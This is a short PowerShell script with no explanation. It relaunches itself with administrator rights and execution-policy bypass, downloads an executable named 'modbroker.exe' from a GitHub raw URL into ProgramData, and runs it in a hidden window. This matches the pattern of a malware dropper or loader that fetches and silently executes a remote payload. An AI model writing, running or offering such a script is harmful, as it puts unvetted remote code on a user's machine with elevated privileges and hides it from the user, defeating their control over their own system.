if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$url = "https://github.com/AnatolyPivder/mod_pository/raw/refs/heads/main/modbroker.exe"

$outputPath = "$env:ProgramData\modbroker.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $outputPath)

Start-Process -FilePath $outputPath -WindowStyle Hidden

